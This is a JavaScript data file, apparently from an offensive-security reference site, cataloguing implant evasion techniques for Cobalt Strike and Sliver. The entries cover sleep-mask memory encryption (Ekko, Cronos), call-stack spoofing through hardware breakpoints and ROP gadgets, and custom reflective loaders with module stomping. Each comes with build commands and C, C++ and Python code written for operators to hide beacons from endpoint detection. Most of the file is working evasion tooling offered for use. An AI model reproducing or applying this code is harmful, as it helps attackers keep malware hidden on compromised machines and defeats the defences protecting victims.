export const implantTechniques = [
  {
    id: 'sleep-mask',
    title: 'Sleep Mask — In-Memory Beacon/Implant Encryption',
    subtitle: 'Encrypt the entire implant in memory and mark it non-executable during sleep to defeat periodic memory scanners',
    tags: ['Sleep Mask Kit', 'Ekko', 'Foliage', 'Cronos', 'APC timer', 'RC4 encrypt', 'RW during sleep', 'VirtualProtect RX→RW→RX', 'SystemFunction032', 'Cobalt Strike', 'Sliver'],
    accentColor: 'blue',
    overview: 'EDRs periodically scan process memory for known implant signatures — especially during sleep intervals when the beacon is idle and awaiting tasking. Sleep masking encrypts the implant\'s own memory (RC4/AES), changes protection to RW (non-executable) for the duration of sleep, then decrypts and restores RX on wake. The Ekko technique orchestrates this using Windows timer queue callbacks and NtContinue to execute the ROP chain without suspicious API call sequences. During the sleep window, memory scanners find only random encrypted bytes.',
    steps: [
      'EDRs scan process memory during beacon sleep — the implant signature exists in memory as-is with no protection',
      'Cobalt Strike: Sleep Mask Kit (Arsenal Kit) controls the sleep implementation — build and load via .cna script',
      'Ekko technique: CreateTimerQueueTimer + ROP chain via NtContinue to orchestrate encrypt → sleep → decrypt without suspicious calls',
      'ROP chain: SetEvent → VirtualProtect(RW) → SystemFunction032(RC4 encrypt) → WaitForSingleObject → SystemFunction032(decrypt) → VirtualProtect(RX) → SetEvent',
      'Cronos: similar to Ekko but uses NtWaitForSingleObject directly; more compatible with various CS versions',
      'Sliver: built-in memory encryption during sleep — XOR+AES, automatic, no configuration needed',
      'Validate: attach a memory scanner to the process during sleep and confirm the implant region shows encrypted bytes',
    ],
    commands: [
      {
        title: 'Cobalt Strike — Sleep Mask Kit build and Ekko technique',
        code: `# ── Arsenal Kit — Sleep Mask Kit ──
ls cobaltstrike/arsenal-kit/kits/sleepmask/
# src/  — modifiable C source for the sleep mask implementation
# include/  — helper headers

# Build (CS 4.7+ — uses beacon_sleep_mask_kit)
cd cobaltstrike/arsenal-kit/kits/sleepmask/
./build.sh 47 WaitForSingleObjectEx true /tmp/sleepmask_out/
# Args: [CS version] [sleep method] [mask heap also?] [output dir]
# WaitForSingleObjectEx = sleep function; true = also encrypt heap allocations

# Load in Cobalt Strike
# Script Manager → Load → /tmp/sleepmask_out/sleepmask.cna
# Verify: generate a beacon, deploy, confirm sleep mask is active in memory

# ── Ekko — Timer-based ROP sleep mask ──
# https://github.com/Cracked5pider/Ekko
# Orchestrates:
# 1. CreateEvent (hEvent1 — trigger)
# 2. CreateTimerQueueTimer (fires after SleepTime)
# 3. Timer callback queues APC chain via NtContinue:
#    a. VirtualProtect(beacon_base, beacon_size, PAGE_READWRITE, &oldProt)
#    b. SystemFunction032(&rc4key, &beacon_region)   ← RC4 encrypt in-place
#    c. WaitForSingleObject(hTimer, SleepTime)        ← actual sleep
#    d. SystemFunction032(&rc4key, &beacon_region)   ← RC4 decrypt in-place
#    e. VirtualProtect(beacon_base, beacon_size, oldProt, &tmp) ← restore RX
#    f. SetEvent(hEvent1)                            ← signal wake
# During step (c): beacon memory is encrypted + RW — scanner finds random bytes only

# Patch sleep in Beacon (CS Malleable C2):
post-ex {
    set sleep_mask "true";   # Enable in-process sleep masking
}

# ── Cronos ──
# https://github.com/Idov31/Cronos
# Similar to Ekko but uses NtWaitForSingleObject for the sleep phase
# More compatible across CS versions; also supports heap masking`
      },
      {
        title: 'Sliver — built-in sleep encryption + custom verification',
        code: `# ── Sliver sleep encryption is automatic ──
sliver > generate --os windows --arch amd64 --sleep 30s --jitter 5s --format exe
# sleep 30s = 30-second sleep interval
# jitter 5s  = ±5s randomisation (anti-timing detection)

# During sleep: Sliver XOR+AES encrypts the implant memory
# No additional configuration needed

# ── Verify sleep encryption is working ──
# 1. Deploy implant, wait for first beacon
# 2. Attach external memory scanner during sleep:
#    Process Hacker 2 → right-click svchost → Memory → search for "MZ" or beacon signature
#    → Should find NO match during sleep window
# 3. Wake and re-scan → signature returns momentarily before next sleep cycle

# ── Custom Sliver sleep mask (source modification) ──
# Edit: implants/sliver/main.go — modify sleep function
# Add custom encrypt/decrypt around the sleep call:
# func beaconSleep(duration time.Duration) {
#     encryptImplantMemory()    // XOR all sections
#     setRegionRW()             // Mark non-executable
#     time.Sleep(duration)      // Sleep
#     setRegionRX()             // Restore
#     decryptImplantMemory()    // Decrypt
# }
make sliver                    # Rebuild with modification`
      }
    ]
  },

  {
    id: 'stack-spoof',
    title: 'Thread Stack Spoofing',
    subtitle: 'Insert synthetic ntdll/kernel32 frames into the call stack before sensitive API calls to defeat stack-origin based detection',
    tags: ['call stack spoofing', 'synthetic frames', 'ROP', 'HWBP VEH', 'LoudSunRun', 'CallStackSpoofer', 'unbacked memory', 'JMP RAX gadget', 'ntdll!RtlUserThreadStart', 'stack walk'],
    accentColor: 'blue',
    overview: 'Modern EDRs inspect the call stack of threads making sensitive API calls (VirtualAlloc, WinHttpSendRequest, CreateThread). If the stack trace reveals that the call originated from memory not backed by a file on disk (implant shellcode in a heap or anonymous allocation), the call is flagged as unbacked. Thread stack spoofing forges the call stack by pushing fake return addresses pointing to ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk before calling the API — the EDR stack walk sees a legitimate call chain.',
    steps: [
      'EDR stack walk: on sensitive API calls, walk RSP frames upward — if any return address is in unbacked memory → flag',
      'Goal: at the moment the API executes, every return address on the stack must point to file-backed (legitimate) code',
      'HWBP approach: set DR0 = target API address; register VEH; in VEH intercept, modify RSP to insert fake frames before execution resumes',
      'ROP gadget approach: JMP to API via a JMP [reg] gadget inside kernel32/ntdll — the CALL to the gadget appears as the stack frame, not our code',
      'Find JMP gadgets: scan kernel32.dll for FF E0 (JMP RAX) or FF D0 (CALL RAX) — use these as indirection layers',
      'LoudSunRun (BOF): drop-in CS BOF that spoof WinHTTP call stack — CS beacon uses it automatically',
      'Apply to: all C2 network callbacks (WinHttpSendRequest), memory allocation, and process injection APIs',
    ],
    commands: [
      {
        title: 'HWBP-based call stack spoof with VEH (C++)',
        code: `// stackspoof.cpp — HWBP + VEH to forge call stack before WinHttpSendRequest
// Compile: x86_64-w64-mingw32-g++ -O2 -s -o spoof.exe stackspoof.cpp -lkernel32 -lntdll
#include <windows.h>
#include <stdio.h>

// Fake frames to inject (must point to file-backed RX memory in ntdll/kernel32)
PVOID g_fakeFrame1 = nullptr;  // ntdll!RtlUserThreadStart+0x21
PVOID g_fakeFrame2 = nullptr;  // kernel32!BaseThreadInitThunk+0x14
PVOID g_target     = nullptr;

LONG CALLBACK VehSpoofHandler(EXCEPTION_POINTERS* ep) {
    if(ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    PCONTEXT ctx = ep->ContextRecord;
    if(!(ctx->Dr6 & 0x1)) return EXCEPTION_CONTINUE_SEARCH;  // DR0 fired?

    // Manually push fake frames onto the stack
    // Decrement RSP by 3 pointer widths, write fake return addresses
    ctx->Rsp -= sizeof(PVOID) * 3;
    PVOID* stack = (PVOID*)ctx->Rsp;
    stack[0] = g_fakeFrame2;  // innermost: BaseThreadInitThunk
    stack[1] = g_fakeFrame1;  // outermost: RtlUserThreadStart
    stack[2] = (PVOID)ctx->Rip;  // actual return (where we actually return)
    // EDR now sees: our_call → BaseThreadInitThunk → RtlUserThreadStart

    // Re-arm HWBP for next call
    ctx->Dr0 = (DWORD64)g_target; ctx->Dr7 = 0x1; ctx->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

void SetupSpoof(PVOID target) {
    g_target = target;
    // Resolve legitimate frame addresses in ntdll/kernel32
    HMODULE ntdll    = GetModuleHandleA("ntdll.dll");
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    g_fakeFrame1 = (PBYTE)GetProcAddress(ntdll,    "RtlUserThreadStart") + 0x21;
    g_fakeFrame2 = (PBYTE)GetProcAddress(kernel32, "BaseThreadInitThunk") + 0x14;

    AddVectoredExceptionHandler(1, VehSpoofHandler);
    CONTEXT ctx={}; ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(),&ctx);
    ctx.Dr0=(DWORD64)target; ctx.Dr7=0x1; ctx.Dr6=0;
    SetThreadContext(GetCurrentThread(),&ctx);
    printf("[+] Stack spoof armed on 0x%p\\n",target);
}

int main(){
    PVOID winHttpSend = GetProcAddress(LoadLibraryA("winhttp.dll"),"WinHttpSendRequest");
    SetupSpoof(winHttpSend);
    // All calls to WinHttpSendRequest now appear to originate from ntdll
    return 0;
}`
      },
      {
        title: 'Find JMP gadgets in kernel32 for ROP-based spoofing (Python)',
        code: `#!/usr/bin/env python3
# Find JMP/CALL gadgets in kernel32.dll for call stack indirection
# pip install pefile
import pefile, struct, sys

dll_path = r"C:\\Windows\\System32\\kernel32.dll"
pe = pefile.PE(dll_path)
base = pe.OPTIONAL_HEADER.ImageBase
data = pe.get_memory_mapped_image()

gadgets = []
for i in range(len(data) - 2):
    b = data[i:i+2]
    if b == b'\\xFF\\xE0':   # JMP RAX
        gadgets.append((base + i, "JMP RAX"))
    elif b == b'\\xFF\\xD0': # CALL RAX
        gadgets.append((base + i, "CALL RAX"))
    elif b == b'\\xFF\\xE3': # JMP RBX
        gadgets.append((base + i, "JMP RBX"))

print(f"Found {len(gadgets)} gadgets in kernel32.dll:")
for addr, name in gadgets[:20]:
    print(f"  0x{addr:016X}  {name}")

# Usage in stack spoof:
# Instead of CALL NtAllocateVirtualMemory:
# 1. Load NtAllocateVirtualMemory address into RAX
# 2. JMP to gadget (JMP RAX at kernel32+offset)
# 3. Stack frame shows: kernel32+offset as return address → appears file-backed
# 4. EDR stack walk: our_code → kernel32!gadget → ntdll!NtAllocateVirtualMemory`
      }
    ]
  },

  {
    id: 'udrl',
    title: 'User-Defined Reflective Loader (UDRL)',
    subtitle: 'Replace the default CS reflective loader with a custom implementation to remove well-known loader signatures',
    tags: ['UDRL', 'reflective loader', 'Arsenal Kit', 'ReflectiveDLL', 'PEB walk', 'API hashing in loader', 'module stomping loader', 'DllMain', 'CS 4.x'],
    accentColor: 'blue',
    overview: 'Cobalt Strike\'s default ReflectiveDLL loader has well-documented byte signatures in every major EDR\'s database. A User-Defined Reflective Loader (UDRL) replaces it with operator-controlled code. The UDRL must implement: (1) locate its own DLL base in memory, (2) parse PE headers and map sections, (3) resolve imports via PEB walking (no GetProcAddress in IAT), (4) fix base relocations, (5) call DllMain. Because the operator controls every byte, the resulting loader has no public signature. Integration with sleep mask and call stack spoofing is also possible directly in the UDRL.',
    steps: [
      'Cobalt Strike default loader (ReflectiveDLL v4.x): well-known byte patterns signatured by CrowdStrike, Defender, SentinelOne, etc.',
      'UDRL entry function: void WINAPI ReflectiveLoader(LPVOID) — called by CS when deploying beacon shellcode',
      'Step 1: locate own DLL base — scan backwards from current RIP for MZ signature',
      'Step 2: parse IMAGE_NT_HEADERS, walk IMAGE_SECTION_HEADERs, allocate and map all sections',
      'Step 3: resolve imports via PEB walk (LDR_DATA_TABLE_ENTRY list) + API hashing — no GetProcAddress in IAT',
      'Step 4: apply base relocations from IMAGE_BASE_RELOCATION table',
      'Step 5: call DllMain(hModule, DLL_PROCESS_ATTACH, NULL) → Beacon starts',
      'Build with Arsenal Kit UDRL template, load .cna, all subsequent Beacon deployments use your custom loader',
    ],
    commands: [
      {
        title: 'UDRL — Arsenal Kit build + key implementation points',
        code: `# ── Arsenal Kit UDRL ──
ls cobaltstrike/arsenal-kit/kits/udrl/
# src/ReflectiveLoader.c   ← modify this
# src/ReflectiveLoader.h
# build.sh

# Build custom UDRL
cd cobaltstrike/arsenal-kit/kits/udrl/
./build.sh /tmp/udrl_out/
# Load: Cobalt Strike → Script Manager → Load → /tmp/udrl_out/udrl.cna
# All subsequent Beacon payloads use your custom loader

# ── UDRL implementation checklist (C) ──
// 1. LOCATE SELF: scan backwards from current RIP for MZ
PBYTE FindBase(void) {
    PBYTE p = (PBYTE)FindBase;  // Start at current code location
    // Align to page boundary
    p = (PBYTE)((ULONG_PTR)p & ~0xFFF);
    while (*(WORD*)p != 0x5A4D) p -= 0x1000;  // Walk back until MZ found
    return p;
}

// 2. PARSE PE HEADERS
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

// 3. RESOLVE IMPORTS VIA PEB WALKING (no GetProcAddress in IAT!)
// Walk PEB→Ldr→InLoadOrderModuleList to find ntdll/kernel32
// Use CRC32 API hashing to resolve specific exports
// This eliminates suspicious IAT entries (GetProcAddress, LoadLibrary)

// 4. APPLY BASE RELOCATIONS
PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(
    base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
// Walk and apply each relocation entry

// 5. CALL DllMain
typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
DllMain_t dllMain = (DllMain_t)(allocated_base + nt->OptionalHeader.AddressOfEntryPoint);
dllMain((HINSTANCE)allocated_base, DLL_PROCESS_ATTACH, NULL);
// Beacon starts executing`
      },
      {
        title: 'UDRL with module stomping integration',
        code: `// Module stomping UDRL — load beacon into a legitimate DLL's .text section
// Combines UDRL with module stomping for file-backed memory + no custom loader signature

// 1. Load a legitimate rarely-used DLL into memory
HMODULE hDecoy = LoadLibraryExA("xpsservices.dll", NULL, LOAD_LIBRARY_AS_DATAFILE);
// xpsservices.dll: legitimate, large .text section, rarely monitored

// 2. Find its .text section base and size
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDecoy;
PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)hDecoy + dos->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
PBYTE textBase = NULL; DWORD textSize = 0;
for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
    if (memcmp(sec->Name, ".text", 5) == 0) {
        textBase = (PBYTE)hDecoy + sec->VirtualAddress;
        textSize = sec->Misc.VirtualSize;
        break;
    }
}

// 3. Make .text writable
DWORD old;
VirtualProtect(textBase, textSize, PAGE_EXECUTE_READWRITE, &old);

// 4. Copy Beacon shellcode into the DLL's .text section
memcpy(textBase, beacon_shellcode, beacon_size);

// 5. Execute Beacon from the DLL .text section
// EDR sees: xpsservices.dll .text → file-backed → no unbacked memory flag
VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &old);
((void(*)())textBase)();`
      }
    ]
  },
];